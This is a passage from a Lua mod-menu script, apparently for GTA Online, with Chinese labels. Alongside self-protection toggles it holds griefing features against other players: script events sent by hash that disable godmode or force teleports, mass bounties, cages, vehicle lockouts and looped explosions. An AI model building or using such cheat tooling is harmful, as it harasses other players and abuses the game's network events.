		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		util.toast("已清除所有 :D")
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end

	end)


	other = menu.list(menu.my_root(), "其他选项", {}, "", function(); end)
	
	menu.action(other, "退出脚本", {}, "", function()
		util.stop_script()
	end)

	menu.toggle(antiset, "阻止网络事件", {}, "阻止网络事件传输", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockNetEvents)
			notification("Toggling block all network events on... stay safe homie", colors.green)
		else
			menu.trigger_command(UnblockNetEvents)
			notification("toggling block all network events off...", colors.red)
		end
	end)


	menu.toggle(antiset, "阻止传入", {}, "阻止网络事件传入", function(on_toggle)
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockIncSyncs)
			notification("Toggling block all incoming syncs on... stay safe homie", colors.green)
		else
			menu.trigger_command(UnblockIncSyncs)
			notification("toggling block all incoming syncs off...", colors.red)
		end
	end)

	menu.toggle(antiset, "阻止传出", {}, "阻止网络事件传出", function(on_toggle)
		if on_toggle then
			notification("Toggling block all outgoing syncs on", colors.green)
			menu.trigger_commands("desyncall on")
		else
			notification("Toggling block all outgoing syncs off", colors.red)
			menu.trigger_commands("desyncall off")
		end
	end)

	menu.toggle(antiset, "防崩视角", {"acc"}, "", function(on_toggle)
		if on_toggle then
			notification("Toggling anticrashcam... stay safe homie", colors.green)
			menu.trigger_commands("anticrashcam on")
			menu.trigger_commands("potatomode on")
		else
			notification("Toggling anticrashcam off...", colors.red)
			menu.trigger_commands("anticrashcam off")
			menu.trigger_commands("potatomode off")
		end
	end)



	menu.toggle(antiset, "自闭模式", {"panic"}, "", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			notification("toggling panic mode on... stay safe homie", colors.green)
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("anticrashcamera on")
		else
			notification("toggling panic mode off...", colors.red)
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("anticrashcamera off")
		end
	end)

	local author = divider(mroot(), "Author: CandyCub  WeChat: CubCandy")

action(lists, "将所有玩家踢出室内", {}, "", function()
	menu.trigger_commands("interiorkickall")
	util.toast("完成 :)")
end)

action(lists, "移除悬赏", {}, "移除自身悬赏", function()
	menu.trigger_commands("removebounty")
	util.toast("成功移除悬赏 :)")
end)

action(lists, "全局悬赏", {}, "包括自己", function(toggle)
	menu.trigger_commands("bountyall 10000")
	util.yield(100)
	menu.trigger_commands("bountycandycub 10000")
end)

toggleloop(lists, "循环全局悬赏", {}, "包括自己", function(toggle)
	menu.trigger_commands("bountyall 10000")
	util.yield(1000)
	menu.trigger_commands("bountycandycub 10000")
	util.yield(1000)
end)


toggle(move, "水平穿墙", {}, "", function(toggle)
	menu.trigger_commands("nocollision")
	menu.trigger_commands("walkonair")
end)

toggle(move, "飞行模式", {}, "", function(toggle)
	menu.trigger_commands("levitate")
end)


toggle(weapons, "队友伤害", {}, "是时候牺牲一下队友了", function(toggle)
	PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), toggle, false) --friendly fire on / off
end)


toggleloop(vehicleset, "循环释放铝箔和热诱弹", {}, "反制系统", function(toggle)
	menu.trigger_commands("deployboth")
	util.yield(2000)
end)

toggle(vehicleset, "载具无碰撞", {}, "地下也许更安全", function(toggle)
	menu.trigger_commands("vehiclenocollision")
end)

local frozen_vehicles = {}

local function update_frozen_vehicles()
    for _, frozen_vehicle in pairs(frozen_vehicles) do
        if ENTITY.DOES_ENTITY_EXIST(frozen_vehicle.vehicle) then
            ENTITY.FREEZE_ENTITY_POSITION(frozen_vehicle.vehicle, true)
        end
    end
end

local frozen_vehicles_menu_list

local function refresh_frozen_vehicles_menu_list()
    menu.delete(frozen_vehicles_menu_list)
    frozen_vehicles_menu_list = menu.list(vehicleset, "已冻结的载具")
    for index, frozen_vehicle in pairs(frozen_vehicles) do
        menu.action(frozen_vehicles_menu_list, frozen_vehicle.name, {"unfreeze"..index}, "点击解冻载具", function()
            table.remove(frozen_vehicles, index)
            ENTITY.FREEZE_ENTITY_POSITION(frozen_vehicle.vehicle, false)
            refresh_frozen_vehicles_menu_list()
        end)
    end
end

local function add_frozen_vehicle(vehicle)
    for index, frozen_vehicle in pairs(frozen_vehicles) do
        if frozen_vehicle.vehicle == vehicle then
            return
        end
    end
    local model = ENTITY.GET_ENTITY_MODEL(vehicle)
    local name = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(model)
    table.insert(frozen_vehicles, {
        name=name,
        vehicle=vehicle
    })
    refresh_frozen_vehicles_menu_list()
    update_frozen_vehicles()
end

menu.action(vehicleset, "冻结载具", {"freeze"}, "", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    if vehicle then
        add_frozen_vehicle(vehicle)
    end
end)

frozen_vehicles_menu_list = menu.list(vehicleset, "已冻结的载具")

local tick_counter = 0
util.create_tick_handler(function()
    if tick_counter % 1000 == 0 then
        update_frozen_vehicles()
    end
    tick_counter = tick_counter + 1
    return true
end)

toggle(allmenu, "全局玩家半无敌", {}, "如果受到爆炸伤害还是会死亡", function(toggle)
	menu.trigger_commands("autohealall")
	util.toast("Done :)")
end)

menu.action(scriptevent, "呼叫警方支援", {}, "呼叫附近警方单位支援", function(toggle)
    local incident_id = memory.alloc(8)
    MISC.CREATE_INCIDENT_WITH_ENTITY(7, PLAYER.PLAYER_PED_ID(), 3, 3, incident_id)
    AUDIO.PLAY_POLICE_REPORT("SCRIPTED_SCANNER_REPORT_PS_2A_01", 0)
	util.yield()
	util.toast("Done :)")
end, true)

local clpid = {}
local bmonke = {}
local wmonke = {}
local schop = {}
local soldchop = {}
local sshark = {}
local sshark2 = {}
local swhale = {}
local inputm = {}
local input_model

text(lpidspawn, "输入字符", {"loadstring"}, "设置一个NPC比如'a_c_chop'", function(input)
    input_model = util.joaat(input)
end, "")

action(lpidspawn, "生成", {}, "", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    STREAMING.REQUEST_MODEL(input_model)
    while not STREAMING.HAS_MODEL_LOADED(input_model) do
        STREAMING.REQUEST_MODEL(input_model)
        util.yield()
    end
    inputm [#inputm + 1] = entities.create_ped(26, input_model, c, 0)
    if not STREAMING.HAS_MODEL_LOADED(input_model) then
        util.toast("无法加载模型!")
    end
end)

action(lpidspawn, "清除", {}, "", function()
    for i = 1, #clpid do
        entities.delete_by_handle(clpid[i]) --delete clone
        clpid[i] = nil
    end

    for i = 1, #bmonke do
        entities.delete_by_handle(bmonke[i]) --delete black monkey
        bmonke[i] = nil
    end

    for i = 1, #wmonke do
        entities.delete_by_handle(wmonke[i]) --delete white monkey
        wmonke[i] = nil
    end

    for i = 1, #schop do
        entities.delete_by_handle(schop[i]) --delete chop
        schop[i] = nil
    end

    for i = 1, #soldchop do
        entities.delete_by_handle(soldchop[i]) --delete shark
        soldchop[i] = nil
    end

    for i = 1, #sshark do
        entities.delete_by_handle(sshark[i]) --delete shark
        sshark[i] = nil
    end

    for i = 1, #sshark2 do
        entities.delete_by_handle(sshark2[i]) --delete shark
        sshark2[i] = nil
    end

    for i = 1, #swhale do
        entities.delete_by_handle(swhale[i]) --delete shark
        swhale[i] = nil
    end

    for i = 1, #inputm do
        entities.delete_by_handle(inputm[i]) --delete input model
        inputm[i] = nil
    end
end)

action(saved, "克隆", {}, "克隆自己", function()
    clpid [#clpid + 1] = PED.CLONE_PED(players.user_ped(), true, true, true) --spawns clone
end)

action(saved, "Pig", {}, "生成Pig", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    STREAMING.REQUEST_MODEL(acpig)
    while not STREAMING.HAS_MODEL_LOADED(acpig) do
        STREAMING.REQUEST_MODEL(acpig)
        util.yield(10)
    end
    bmonke [#bmonke + 1] = entities.create_ped(26, acpig, c, 0) --spawns black monkey
    if not STREAMING.HAS_MODEL_LOADED(acpig) then
        util.toast("无法加载模型!")
    end
end)

action(saved, "黑色猴子", {}, "生成黑色猴子", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    STREAMING.REQUEST_MODEL(BlackMonke)
    while not STREAMING.HAS_MODEL_LOADED(BlackMonke) do
        STREAMING.REQUEST_MODEL(BlackMonke)
        util.yield(10)
    end
    bmonke [#bmonke + 1] = entities.create_ped(26, BlackMonke, c, 0) --spawns black monkey
    if not STREAMING.HAS_MODEL_LOADED(BlackMonke) then
        util.toast("无法加载模型!")
    end
end)

action(saved, "白色猴子", {}, "生成白色猴子", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    STREAMING.REQUEST_MODEL(WhiteMonke)
    while not STREAMING.HAS_MODEL_LOADED(WhiteMonke) do
        STREAMING.REQUEST_MODEL(WhiteMonke)
        util.yield(10)
    end
    wmonke [#wmonke + 1] = entities.create_ped(26, WhiteMonke, c, 0)
    if not STREAMING.HAS_MODEL_LOADED(WhiteMonke) then
        util.toast("无法加载模型!")
    end
end)

action(saved, "小查", {}, "生成小查", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user_ped())
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    STREAMING.REQUEST_MODEL(chop)
    while not STREAMING.HAS_MODEL_LOADED(chop) do
        STREAMING.REQUEST_MODEL(chop)
        util.yield(10)
    end
    local spawnedchop = entities.create_ped(26, chop, c, 0)
    schop [#schop + 1] = spawnedchop
    PED.SET_PED_AS_GROUP_MEMBER(spawnedchop, PED.GET_PED_GROUP_INDEX(PLAYER.PLAYER_PED_ID()))  --makes chop follow you 
    PED.SET_PED_NEVER_LEAVES_GROUP(spawnedchop, true)
    PED.SET_PED_CONFIG_FLAG(spawnedchop, 24, true)
    local chopblip = HUD.ADD_BLIP_FOR_ENTITY(spawnedchop)
    HUD.SET_BLIP_SPRITE(chopblip, 273)
    PED.SET_PED_AS_GROUP_MEMBER(schop, PED.GET_PED_GROUP_INDEX(PLAYER.PLAYER_PED_ID()))
    PED.SET_PED_NEVER_LEAVES_GROUP(schop, true)
    if not STREAMING.HAS_MODEL_LOADED(chop) then
        util.toast("无法加载模型!")
    end
end)

action(saved, "小查2", {}, "生成小查", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user_ped())
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    STREAMING.REQUEST_MODEL(oldchop)
    while not STREAMING.HAS_MODEL_LOADED(oldchop) do
        STREAMING.REQUEST_MODEL(oldchop)
        util.yield(10)
    end
    local spawnedoldchop = entities.create_ped(26, oldchop, c, 0)
    soldchop [#soldchop + 1] = spawnedoldchop
    PED.SET_PED_AS_GROUP_MEMBER(spawnedoldchop, PED.GET_PED_GROUP_INDEX(PLAYER.PLAYER_PED_ID()))
    PED.SET_PED_NEVER_LEAVES_GROUP(spawnedoldchop, true)
    PED.SET_PED_CONFIG_FLAG(spawnedoldchop, 24, true)
    local oldchopblip = HUD.ADD_BLIP_FOR_ENTITY(spawnedoldchop)
    HUD.SET_BLIP_SPRITE(oldchopblip, 273)
    if not STREAMING.HAS_MODEL_LOADED(oldchop) then
        util.toast("无法加载模型!")
    end
end)

action(saved, "鲨鱼", {}, "生成鲨鱼", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    STREAMING.REQUEST_MODEL(shark)
    while not STREAMING.HAS_MODEL_LOADED(shark) do
        STREAMING.REQUEST_MODEL(shark)
        util.yield(10)
    end
    sshark [#sshark + 1] = entities.create_ped(26, shark, c, 0)
    if not STREAMING.HAS_MODEL_LOADED(shark) then
        util.toast("无法加载模型!")
    end
end)

action(saved, "锤头鲨鱼", {}, "生成锤头鲨鱼", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    STREAMING.REQUEST_MODEL(shark2)
    while not STREAMING.HAS_MODEL_LOADED(shark2) do
        STREAMING.REQUEST_MODEL(shark2)
        util.yield(10)
    end
    sshark2 [#sshark2 + 1] = entities.create_ped(26, shark2, c, 0)
    if not STREAMING.HAS_MODEL_LOADED(shark2) then
        util.toast("无法加载模型!")
    end
end)

action(saved, "鲸鱼", {}, "生成鲸鱼", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    STREAMING.REQUEST_MODEL(whale)
    while not STREAMING.HAS_MODEL_LOADED(whale) do
        STREAMING.REQUEST_MODEL(whale)
        util.yield(10)
    end
    swhale [#swhale + 1] = entities.create_ped(26, whale, c, 0)
    if not STREAMING.HAS_MODEL_LOADED(whale) then
        util.toast("无法加载模型!")
    end
end)

action(saved, "警察", {}, "生成警察", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    STREAMING.REQUEST_MODEL(cop01)
    while not STREAMING.HAS_MODEL_LOADED(cop01) do
        STREAMING.REQUEST_MODEL(cop01)
        util.yield(10)
    end
    swhale [#swhale + 1] = entities.create_ped(26, cop01, c, 0)
    if not STREAMING.HAS_MODEL_LOADED(cop01) then
        util.toast("无法加载模型!")
    end
end)


toggle(world, "土豆模式", {}, "", function(toggle)
    menu.trigger_commands("potatomode")
end)

toggle(world, "暴乱模式", {}, "", function(toggle)
    MISC.SET_RIOT_MODE_ENABLED(toggle)
end)

island_block = 0
menu.action(world, "生成空中平台", {}, "", function()
    local c = {}
    c.x = 0
    c.y = 0
    c.z = 500
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c.x, c.y, c.z+5)
    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then
        request_model_load(1054678467)
        island_block = entities.create_object(1054678467, c)
    end
end)

menu.action(world, "生成空中大平台", {}, "", function()
    local gridSize = 10 -- 平台大小
    local offset = 130 -- 偏移量

    for i = 1, gridSize do
        for j = 1, gridSize do
            local c = {}
            c.x = (i - 1) * offset - (gridSize / 2 - 0.5) * offset
            c.y = (j - 1) * offset - (gridSize / 2 - 0.5) * offset
            c.z = 400
            request_model_load(1054678467)
            island_block = entities.create_object(1054678467, c)
	        util.yield(100)
        end
    end
	util.toast("Done :)")
end)

action(online, "刑事毁坏加分数", {}, "尝试赢得刑事毁坏 (精神状态会增加)", function()
    local cartable = {}

    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local defz = c.z 
    STREAMING.REQUEST_MODEL(expcar)
    while not STREAMING.HAS_MODEL_LOADED(expcar) do
        STREAMING.REQUEST_MODEL(expcar)
        util.yield()
    end
    STREAMING.REQUEST_MODEL(floorbr)
    while not STREAMING.HAS_MODEL_LOADED(floorbr) do
        STREAMING.REQUEST_MODEL(floorbr)
        util.yield()
    end
    local success, floorcoords
    repeat
        success, floorcoords = util.get_ground_z(c.x, c.y)
        util.yield()
    until success
    floorcoords = floorcoords - 100
    c.z = floorcoords
    local floorrig = entities.create_object(floorbr, c)
    c.z = defz
    c.z = c.z - 95
    for i = 1, 22 do
        cartable[#cartable + 1] = entities.create_vehicle(expcar, c, 0)
    end
    util.yield(1000)
    FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), c.x, c.y, floorcoords, exp, 100.0, false, false, 0.0)
    util.yield(500)
    entities.delete_by_handle(floorrig)
    util.yield(1000)

    for i = 1, #cartable do
        entities.delete_by_handle(cartable[i])
        cartable[i] = nil
    end
end)

toggleloop(online, "自动传送检查点", {}, "赢得检查点", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
    local cdblip = HUD.GET_BLIP_COORDS(dblip)
    ENTITY.SET_ENTITY_COORDS(players.user_ped(), cdblip.x, cdblip.y, cdblip.z, false, false, false, false)
    util.yield(1500)
end)


action(fixgame, "卡云修复", {}, "卡云时尝试修复", function()
    if NETWORK.NETWORK_CAN_BAIL() then
        NETWORK.NETWORK_BAIL(0, 0, 0)
    end
end)

action(newbeta, "test", {}, "testing", function()
	



end)

local togglestate = false

vehicle_uses = 0
ped_uses = 0
pickup_uses = 0
player_uses = 0
object_uses = 0
robustmode = false
reap = false

GenerateFeatures = function(pid)
	cage = util.joaat("prop_gascage01")	
	ladder = 1888301071
	ground = -1951226014
	attach = 1
	veh_to_attach = 1

	function v3_2(x, y, z)
        if x == nil then
            x = 0
        end
        if y == nil then
            y = 0
        end
        if z == nil then
            z = 0
        end
    end



	function spawn_ped(ped_name, pid)
		local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local ped_hash = util.joaat(ped_name)
		STREAMING.REQUEST_MODEL(ped_hash)
		while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
			util.yield()
		end
	
		aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
	
		local ped = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

		coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-2, 2)
        coords_ped.y = coords_ped.y + math.random(-2, 2)
        coords_ped.z = coords_ped.z

        ENTITY.SET_ENTITY_COORDS(ped, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
		ENTITY.SET_ENTITY_VISIBLE(ped, false)
		notification("Spawned [" .. ped_name .. "] on " .. PLAYER.GET_PLAYER_NAME(pid), colors.green)
	end

	local prank = mlist(proot(pid), "恶搞选项", {}, "")
	local attackers = mlist(prank, "攻击者", {}, "")
	local attackersweapons = mlist(attackers, "武器选项", {}, "")
	local attackerslist = mlist(attackers, "攻击者选项", {}, "")
	local damagelist = mlist(prank, "伤害选项", {}, "")
	local friendly = mlist(proot(pid), "友好选项", {}, "")
	local drops = mlist(friendly, "掉落物", {}, "")
	local explosions = mlist(prank, "爆炸选项", {}, "")
	local cages = mlist(prank, "笼子选项", {}, "")
	local player_vehicle = mlist(prank, "载具选项", {}, "")
	local spawner = mlist(proot(pid), "生成选项", {}, "")
	local psaved = mlist(spawner, "保存", {}, "")
	local shortcutslist = mlist(proot(pid), "快速选项", {}, "")
	local explodeall = mlist(proot(pid), "栽赃选项", {}, "栽赃选项")
	local miscplayer = mlist(proot(pid), "透视选项", {}, "")

	lock_sub_vehicle_tab = menu.list(prank, "车辆恶搞", {}, "", function(); end)

    menu.action(lock_sub_vehicle_tab,"锁门", {"lockveh"}, "Locks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
		end
		util.toast("Done :)")
	end)

	menu.action(lock_sub_vehicle_tab,"解锁", {"unlockveh"}, "Unlocks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)		
		end
		util.toast("Done :)")
	end)

	menu.action(lock_sub_vehicle_tab,"使车辆可用", {"engineon"}, "Makes player's vehicle drivable again",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, false)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"使车辆不可用", {"engineoff"}, "Makes player's vehicle undrivable",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, true)		
		end
	end)
	
	griefing = menu.list(prank, "玩家恶搞", {}, "", function(); end)

	classlc = menu.list(griefing, "经典", {}, "", function(); end)
	
	menu.toggle_loop(classlc, "水柱", {""}, "", function(on_click)
	        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)

    end)
	
	menu.toggle_loop(classlc, "火柱", {""}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)

    end)

	menu.action(griefing, "关闭玩家无敌模式", {}, "关闭玩家无敌模式", function()
	        if players.exists(pid) then
			send_script_event(-1388926377, pid, {pid, 1})
			send_script_event(-1388926377, pid, {pid, 1})
        end
		util.toast("Done :)")
	end)
	
	menu.action(griefing, "上岛", {}, "send to iland", function()
		if players.exists(pid) then
			send_script_event(1361475530, pid, {pid, 0})
		end
		util.toast("Done :)")
    end)
	
	menu.action(griefing, "拉仓库", {}, "", function()
		if players.exists(pid) then
			send_script_event(2130458390, pid, {pid, 0})
		end
		util.toast("Done :)")
    end)
	
	
	menu.action(griefing, "阻止被动", {}, "", function()
		if players.exists(pid) then
			send_script_event(13680555548, pid, {pid, 0})
		end
		util.toast("Done :)")
    end)

	cage_options = menu.list(griefing, "笼子", {}, "")

	menu.divider(cage_options, "笼子")

	menu.action(cage_options, "笼子", {"cage"}, "", function()
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			util.yield(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				notification("Failed to kick player out of the vehicle", colors.red)
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		end
		cage_player(pos)
	end)
	
	menu.action(cage_options, "餐车", {"foodtruckcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local hash = 4022605402
		STREAMING.REQUEST_MODEL(hash)

		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)

		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)
	
menu.action(cage_options, "狗笼", {"doghousecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = -1782242710
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)
	
menu.action(cage_options, "圣诞快乐", {"jollycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

menu.action(cage_options, "圣诞快乐2.0", {"jollycage2"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)
	
menu.action(cage_options, "圣诞快乐3.0", {"jollycage3"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield()

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

menu.action(cage_options, "安全空间", {"safecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

menu.action(cage_options, "垃圾桶", {"trashcage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

menu.action(cage_options, "钱笼子", {"moneycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

